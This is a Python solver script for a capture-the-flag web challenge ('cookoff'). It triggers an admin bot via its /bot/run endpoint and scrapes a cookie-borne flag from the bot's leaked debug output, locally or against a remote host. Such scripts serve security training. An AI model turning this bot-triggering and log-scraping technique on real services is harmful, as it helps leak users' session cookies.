#!/usr/bin/env python3
import argparse
import os
import re
import signal
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path

FLAG_RE = re.compile(r"GPNCTF\{[^}\r\n]+\}")
HERE = Path(__file__).resolve().parent
DEFAULT_SERVER = HERE / "cookoff_local_server.js"


def request(url: str, timeout: float = 10.0) -> tuple[int, str]:
    req = urllib.request.Request(url, headers={"User-Agent": "cookoff-solver/1.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        body = r.read().decode("utf-8", "replace")
        return r.status, body


def wait_port(url: str, tries: int = 50) -> None:
    last = None
    for _ in range(tries):
        try:
            request(url, timeout=0.5)
            return
        except Exception as e:
            last = e
            time.sleep(0.1)
    raise RuntimeError(f"service did not become ready: {url}: {last!r}")


def start_local_server(server_js: Path, flag: str, cookoff_root: str | None) -> subprocess.Popen:
    env = os.environ.copy()
    env["FLAG"] = flag
    if cookoff_root:
        env["COOKOFF_ROOT"] = cookoff_root
    env["WEB_PORT"] = str(getattr(start_local_server, "web_port", 1337))
    env["BOT_PORT"] = str(getattr(start_local_server, "bot_port", 18080))
    proc = subprocess.Popen(
        ["node", str(server_js)],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
        env=env,
        preexec_fn=os.setsid if hasattr(os, "setsid") else None,
    )
    wait_port(f"http://127.0.0.1:{env['BOT_PORT']}/bot")
    wait_port(f"http://127.0.0.1:{env['WEB_PORT']}/")
    return proc


def drain_lines(proc: subprocess.Popen, until_flag: bool = True, seconds: float = 5.0) -> str:
    end = time.time() + seconds
    chunks: list[str] = []
    assert proc.stdout is not None
    fd = proc.stdout.fileno()
    import os as _os
    import select
    try:
        _os.set_blocking(fd, False)
    except Exception:
        pass
    while time.time() < end:
        r, _, _ = select.select([fd], [], [], 0.1)
        if not r:
            continue
        try:
            data = _os.read(fd, 8192)
        except BlockingIOError:
            continue
        if not data:
            break
        chunks.append(data.decode("utf-8", "replace"))
        joined = "".join(chunks)
        if until_flag and FLAG_RE.search(joined) and "flagGPNCTF{" in joined:
            break
    return "".join(chunks)


def run_local(args: argparse.Namespace) -> int:
    flag = args.flag
    print(f"[+] starting local cookoff services with FLAG={flag}")
    proc = start_local_server(Path(args.server_js), flag, args.cookoff_root)
    transcript = ""
    try:
        transcript += drain_lines(proc, until_flag=False, seconds=0.5)
        target = f"http://localhost:{args.web_port}/"
        bot_url = f"http://127.0.0.1:{args.bot_port}/bot/run?" + urllib.parse.urlencode({"url": target})
        print(f"[+] triggering bot: {bot_url}")
        status, body = request(bot_url, timeout=15)
        print(f"[+] /bot/run HTTP {status}, body={body!r}")
        transcript += drain_lines(proc, until_flag=True, seconds=5.0)
        print("\n--- captured bot log ---")
        print(transcript.rstrip())
        print("--- end log ---\n")
        flags = FLAG_RE.findall(transcript + body)
        if not flags:
            print("[-] no GPNCTF{...} flag found in local transcript")
            return 2
        found = flags[0]
        cookie_proof = f"flag{found}" in transcript
        print(f"[+] extracted flag: {found}")
        print(f"[+] proof: {'OK' if cookie_proof else 'MISSING'} - bot log contains document.cookie-style value flag<FLAG>")
        return 0 if cookie_proof else 3
    finally:
        try:
            if hasattr(os, "killpg"):
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            else:
                proc.terminate()
        except Exception:
            pass
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()


def run_remote(args: argparse.Namespace) -> int:
    base = args.remote.rstrip("/")
    target = args.target_url or "http://localhost:1337/"
    url = base + "/bot/run?" + urllib.parse.urlencode({"url": target})
    print(f"[+] triggering remote bot: {url}")
    try:
        status, body = request(url, timeout=args.timeout)
    except Exception as e:
        print(f"[-] request failed: {e!r}")
        return 1
    print(f"[+] HTTP {status}")
    print(body[:4000])
    flags = FLAG_RE.findall(body)
    if flags:
        print(f"[+] extracted flag from HTTP response: {flags[0]}")
        return 0
    print("[-] no flag in HTTP response. This debug-log bug is remotely exploitable only if the deployment exposes stdout/stderr to the client.")
    return 2


def main() -> int:
    ap = argparse.ArgumentParser(description="Cookoff local/remote solver")
    mode = ap.add_mutually_exclusive_group(required=True)
    mode.add_argument("--local", action="store_true", help="start local harness and extract FLAG from bot debug logs")
    mode.add_argument("--remote", help="remote base URL, e.g. https://host")
    ap.add_argument("--server-js", default=str(DEFAULT_SERVER), help="path to cookoff_local_server.js")
    ap.add_argument("--cookoff-root", default=str((HERE / ".." / "cookoff").resolve()), help="directory containing index.html")
    ap.add_argument("--flag", default="GPNCTF{LOCAL_FAKE_FLAG_DEBUG_LOG_LEAK_PROOF}", help="local fake flag")
    ap.add_argument("--target-url", help="URL sent to bot; default http://localhost:1337/")
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--web-port", type=int, default=1337)
    ap.add_argument("--bot-port", type=int, default=18080)
    args = ap.parse_args()
    start_local_server.web_port = args.web_port
    start_local_server.bot_port = args.bot_port
    if args.local:
        return run_local(args)
    return run_remote(args)


if __name__ == "__main__":
    raise SystemExit(main())
